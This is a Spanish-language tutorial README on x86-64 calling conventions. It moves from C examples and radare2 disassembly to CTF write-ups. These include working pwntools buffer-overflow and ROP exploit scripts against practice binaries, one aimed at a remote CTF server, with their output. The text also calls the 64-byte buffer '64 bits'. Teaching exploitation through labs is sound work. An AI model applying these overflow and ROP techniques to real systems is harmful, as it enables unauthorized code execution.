# Calling Conventions

Este repositorio se enfoca en el estudio de las convenciones de llamada en arquitecturas de 64 bit. Estas convenciones definen las reglas para el paso de parámetros a las funciones y la gestión de las pilas de llamadas. Comprender estas convenciones es fundamental para quienes desean adentrarse en la ingeniería inversa y/o explotación de vulnerabilidades en sistemas de bajo nivel. A través de este repositorio se pretende facilitar el aprendizaje de estos conceptos.

Comenzaremos compilando y analizando el siguiente codigo.

```c
#include <stdio.h>

void vuln(int check, int check2, int check3) {
    if(check == 0xdeadbeef && check2 == 0xdeadc0de && check3 == 0xc0ded00d) {
        puts("Nice!");
    } else {
        puts("Not nice!");
    }
}

int main() {
    vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d);
    vuln(0xdeadc0de, 0x12345678, 0xabcdef10);
}
```
La función `vuln` contiene una condición que verifica si los tres parámetros de entrada coinciden con los valores esperados: `0xdeadbeef`, `0xdeadc0de` y `0xc0ded00d`. Si la condición se cumple, imprime `Nice!` en la salida estándar; de lo contrario, muestra `Not nice!`. La función `main` invoca vuln dos veces: la primera con los parámetros correctos y la segunda con valores inesperados.

Para compilar este código, utilizaremos las siguientes flags:

```shell
$ gcc source.c -o vuln-64 -no-pie -fno-stack-protector
```

Al ejecutar el binario, obtenemos los resultados esperados:

```shell
$ ./vuln-64
Nice!
Not nice!
```

Utilizaremos `radare2` para desemsamblar la funcion `main` y observar como se realizan las llamadas a `vuln`.

```asm
            ; DATA XREF from entry0 @ 0x40105d
┌ 51: int main (int argc, char **argv, char **envp);
│           0x0040116c      55             push rbp
│           0x0040116d      4889e5         mov rbp, rsp
│           0x00401170      ba0dd0dec0     mov edx, 0xc0ded00d
│           0x00401175      bedec0adde     mov esi, 0xdeadc0de
│           0x0040117a      bfefbeadde     mov edi, 0xdeadbeef
│           0x0040117f      e89effffff     call sym.vuln
│           0x00401184      ba10efcdab     mov edx, 0xabcdef10
│           0x00401189      be78563412     mov esi, 0x12345678         ; 'xV4\x12'
│           0x0040118e      bfdec0adde     mov edi, 0xdeadc0de
│           0x00401193      e88affffff     call sym.vuln
│           0x00401198      b800000000     mov eax, 0
│           0x0040119d      5d             pop rbp
└           0x0040119e      c3             ret
```

En el desensamblado anterior vemos que se pasan los valores `0xdeadbeef`, `0xdeadc0de` y `0xc0ded00d` a los registros `edi`, `esi`, `edx` utilizando la instruccion `mov`, esta instruccion se utiliza para cargar los valores que se pasarán como argumentos a la función `vuln`. Los registros utilizados son `rdi`, `rsi` y `rdx`, que son los registros de 64 bits designados para recibir los parámetros en la convención de llamada x86-64, este es el orden.

```
- rdi: First argument
- rsi: Second argument
- rdx: Third argument
- rcx: Fourth argument
- r8: Fifth argument
- r9: Sixth argument
```

> Es crucial notar que los valores movidos a estos registros están representados en 32 bits, lo que se indica mediante el uso de los prefijos `e` (`edx`, `esi`, `edi`). Esto refleja cómo se manejan los datos de diferentes tamaños en el contexto de la memoria del programa.

Podras decir "Mmmm okay.. se entiende hasta ahora" ¿pero que pasa si pongo mas argumentos? Para eso programe el siguiente codigo.

```c
//gcc source.c -o vuln-32 -no-pie -fno-stack-protector -m32
//gcc source.c -o vuln-64 -no-pie -fno-stack-protector

#include <stdio.h>

void vuln(int check, int check2, int check3, int check4, int check5, int check6, int check7, int check8) {
    if(check == 0xdeadbeef && check2 == 0xdeadc0de && check3 == 0xc0ded00d && check4 == 0x0badf00d && check5 == 0xfee1dead && check6 == 0xfeedface && check7 == 0x8badf00d && check8 == 0xdecafbad) {
        puts("Nice!");
    } else {
        puts("Not nice!");
    }
}

int main() {
    vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d, 0x0badf00d, 0xfee1dead, 0xfeedface, 0x8badf00d, 0xdecafbad);
    vuln(0xdeadc0de, 0x12345678, 0xabcdef10, 0xfaceb00c, 0xdeadf00d, 0xfacefeed, 0x8badf00d, 0x1c0de);
}
```

Muy parecido al primero pero con mas argumentos (se compila utilizando las mismas flags). En la primera llamada a `vuln` son los parametros correctos, y en la segunda los incorrectos. Utilizando `radare2` veremos el desensamblado de la funcion `main`. 

```asm
            ; DATA XREF from entry0 @ 0x401068
┌ 117: int main (int argc, char **argv, char **envp);
│           0x004011c2      f30f1efa       endbr64
│           0x004011c6      55             push rbp
│           0x004011c7      4889e5         mov rbp, rsp
│           0x004011ca      68adfbcade     push 0xffffffffdecafbad
│           0x004011cf      680df0ad8b     push 0xffffffff8badf00d
│           0x004011d4      41b9cefaedfe   mov r9d, 0xfeedface
│           0x004011da      41b8addee1fe   mov r8d, 0xfee1dead
│           0x004011e0      b90df0ad0b     mov ecx, 0xbadf00d
│           0x004011e5      ba0dd0dec0     mov edx, 0xc0ded00d
│           0x004011ea      bedec0adde     mov esi, 0xdeadc0de
│           0x004011ef      bfefbeadde     mov edi, 0xdeadbeef
│           0x004011f4      e83dffffff     call sym.vuln
│           0x004011f9      4883c410       add rsp, 0x10
│           0x004011fd      68dec00100     push 0x1c0de
│           0x00401202      680df0ad8b     push 0xffffffff8badf00d
│           0x00401207      41b9edfecefa   mov r9d, 0xfacefeed
│           0x0040120d      41b80df0adde   mov r8d, 0xdeadf00d
│           0x00401213      b90cb0cefa     mov ecx, 0xfaceb00c
│           0x00401218      ba10efcdab     mov edx, 0xabcdef10
│           0x0040121d      be78563412     mov esi, 0x12345678         ; 'xV4\x12'
│           0x00401222      bfdec0adde     mov edi, 0xdeadc0de
│           0x00401227      e80affffff     call sym.vuln
│           0x0040122c      4883c410       add rsp, 0x10
│           0x00401230      b800000000     mov eax, 0
│           0x00401235      c9             leave
└           0x00401236      c3             ret
```

Vemos que cuando ya no tiene mas argumentos utiliza la instruccion `push`. Esta instruccion es fundamental cuando necesitas pasar más argumentos de los que pueden ser manejados por los registros disponibles en la convención de llamada. Como sabemos en x86-64, los primeros seis argumentos se pasan a través de los registros (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`). Sin embargo, si necesitas pasar más argumentos o si algunos de los valores son más grandes que lo que puede contener un registro de 32 bits, puedes utilizar push para colocarlos en la pila. Espero que con los dos ejemplos anteriores te haya quedado claro a nivel teorico como funcionan las convenciones de llamadas.

## Practica con desafios

Para la practica vamos a resolver el desafio `Params` de [ForeverCTF](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) y por ultimo el `exploiting-with-params` de las notas de [ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions). Estos desafios tienen que ver sobre las convenciones de llamadas, entonces nos vendran de lujo para practicar lo aprendido recientemente.

### Params

Se nos proporciona un binario llamado `params` con las siguientes protecciones.

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

El binario cuenta con Partial RELRO y NX habilitado, lo que significa que no se pueden ejecutar datos en la pila, aunque la protección contra sobrescritura de la tabla de símbolos es parcial. Las demas protecciones están deshabilitadas. Si ejecutamos el binario nos preguntan por nuestro nombre y podemos indicarle a que direccion de memoria apuntara cada registro.

```shell
$ ./params
hey bb
whats ur name
test
hey test
you can set my registers any day of the week
rax: 1
rbx: 1
rcx: 1
rdx: 1
rsi: 1
rdi: 1
```

Con Ghidra podemos ver la funcion main del binario.

```c
undefined  [16] main(void)

{
  undefined auVar1 [16];
  undefined8 local_78;
  undefined8 local_70;
  ulong local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  char local_48 [64];
  
  puts("hey bb");
  puts("whats ur name");
  gets(local_48);
  printf("hey %s\n",local_48);
  puts("you can set my registers any day of the week");
  local_50 = 0;
  local_58 = 0;
  local_60 = 0;
  local_68 = 0;
  local_70 = 0;
  local_78 = 0;
  printf("rax: ");
  FUN_004010c0(&DAT_0040205b,&local_50);
  printf("rbx: ");
  FUN_004010c0(&DAT_0040205b,&local_58);
  printf("rcx: ");
  FUN_004010c0(&DAT_0040205b,&local_60);
  printf("rdx: ");
  FUN_004010c0(&DAT_0040205b,&local_68);
  printf("rsi: ");
  FUN_004010c0(&DAT_0040205b,&local_70);
  printf("rdi: ");
  FUN_004010c0(&DAT_0040205b,&local_78);
  auVar1._8_8_ = 0;
  auVar1._0_8_ = local_68;
  return auVar1 << 0x40;
}
```

Define un buffer de 64 bits y toma nuestro input utilizando `gets`, tenemos un *Buffer Overflow* ya que la funcion `gets` no controla el numero de bytes que ingresamos. Luego define 6 variables con un valor de 0 y nos hace indicarle el valor que tendra cada registro. Si seguimos analizando el Symbol Tree veremos una funcion `get_flag` con el siguiente contenido.

```c
void get_flag(long param_1,long param_2,long param_3,long param_4)

{
  char *local_18;
  undefined8 local_10;
  
  if ((((param_1 == 0x1337) && (param_2 == 0xcafebabe)) && (param_3 == 0xdeadbeef)) &&
     (param_4 == 4)) {
    local_18 = "/bin/sh";
    local_10 = 0;
    execve("/bin/sh",&local_18,(char **)0x0);
  }
  return;
}
```

Esta funcion verifica mediante un condicional que los primeros cuatro parametros sean igual a `0x1337`, `0xcafebabe` , `0xdeadbeef` y `4`, si la condicion se cumple nos devuelve una reverse shell. Para resolver este desafio debemos explotar un *Buffer Overflow* para saltar a la funcion `get_flag`, luego de eso debemos indicar los parametros que espera para que nos devuelva la shell, podemos hacer esto indicandole el valor de las direcciones de cuando ejecutamos el binario.

Al recodar las convenciones de llamada, debemos asignar a los registros los siguientes valores: al registro `rdi` le corresponde la dirección `0x1337`, al `rsi` se le asigna la dirección `0xcafebabe`, al `rdx` se le otorga la dirección `0xdeadbeef`, y al `rcx` se le pasa el valor `4`. Con el siguiente exploit resolvemos el desafio.

```python
from pwn import *

p = remote('forever.isss.io', 1304)

payload = b'A' * 64
payload += p64(0x000000000040101a)      # stack alignment 16 bytes ubuntu
payload += p64(0x401354)                # get_flag() address
p.sendline(payload)


p.sendline(b'0')
p.sendline(b'0')
p.sendline(b'4')
p.sendline(str(0xdeadbeef))
p.sendline(str(0xcafebabe))
p.sendline(str(0x1337))

p.interactive()
```

Al ejecutarlo podremos resolver el desafio.

```shell
$ python3 solve.py
[+] Opening connection to forever.isss.io on port 1304: Done
[*] Switching to interactive mode
hey bb
whats ur name
hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@
you can set my registers any day of the week
rax: $ id
uid=1000(params) gid=1000(params) groups=1000(params)
$ ls
flag.txt
$ cat flag.txt
utflag{u_got_my_params!235407F7}
```

### exploiting_with_params Ironstones

Se nos proporciona un binario con las siguientes protecciones.

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Tiene las mismas protecciones que el binario anterior, la unica diferencia es que acá no es necesario hacerle reversing ya que nos entregan su codigo fuente.

```c
//gcc source.c -o vuln-32 -no-pie -fno-stack-protector -m32
//gcc source.c -o vuln-64 -no-pie -fno-stack-protector

#include <stdio.h>

void vuln() {
    char buffer[40];
    puts("Overflow Me");
    gets(buffer);
}

int main() {
    vuln();
}

void flag(int check, int check2) {
    if(check == 0xdeadc0de && check2 == 0xc0ded00d) {
        puts("Got it!");
    }
}
```

Bemos que en la funcion `main` llama a la funcion `vuln`, en esta funcion se define un buffer de 40 bytes y toma nuestro input utilizando `gets`, acá nuevamente tenemos un *Buffer Overflow* ya que como bien sabemos, `gets` no valida el largo del input ingresado por nosotros, entonces podremos desbordar el buffer. Mas abajo define una funcion `flag` que espera los parametros `0xdeadc0de` y `0xc0ded00d` para devolvernos un `Got it!`, indicandonos que resolvimos el desafio.

Para resolver este desafio debemos explotar el *Buffer Overflow*, saltar a la funcion flag, utilizar un gadget `pop rdi; ret` para asignarle el valor `0xdeadc0de` y un gadget `pop rsi; ret` para asignarle el valor `0xc0ded00d` y resolver el desafio, para encontrar los gadgets utilizaremos `ROPgadget`.

```shell
$ ROPgadget --binary vuln-64 | grep "rdi"
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x00000000004010a6 : or dword ptr [rdi + 0x404038], edi ; jmp rax
0x00000000004011fb : pop rdi ; ret

$ ROPgadget --binary vuln-64 | grep "rsi"
0x00000000004011f9 : pop rsi ; pop r15 ; ret
```

Una vez con esto tenemos lo necesario para escribir nuestro script de solucion, con el siguiente podremos resolver el desafio.

```python3
from pwn import *

p = process('./vuln-64')

POP_RDI = 0x00000000004011fb    
POP_RSI = 0x00000000004011f9

payload = b'A' * 56                 # offset
payload += p64(POP_RDI)             # pop rdi ; ret
payload += p64(0xdeadc0de)          # check one
payload += p64(POP_RSI)
payload += p64(0xc0ded00d)          # check two
payload += p64(0x90)
payload += p64(0x0040116f)          # flag() function

p.sendline(payload)
p.interactive()
```

Vemos que defino los dos gadgets, luego exploto el Buffer Overflow (el offset era de 56 bytes), le paso el gadget de `POP_RDI` para asignarle el valor `0xdeadc0de` al registro, luego le paso el gadget `POP_RSI` para asignarle el valor `0xc0ded00d` al registro, por ultimo paso un `0x90` (NOP) para el valor `pop r15` del gadget `POP_RSI` y por ultimo llamo a la funcion `flag()`, al ejecutar el script resolvemos el desafio.

```shell
$ python3 solve.py
[+] Starting local process './vuln-64': pid 22245
[*] Switching to interactive mode
Overflow Me
Got it!
```
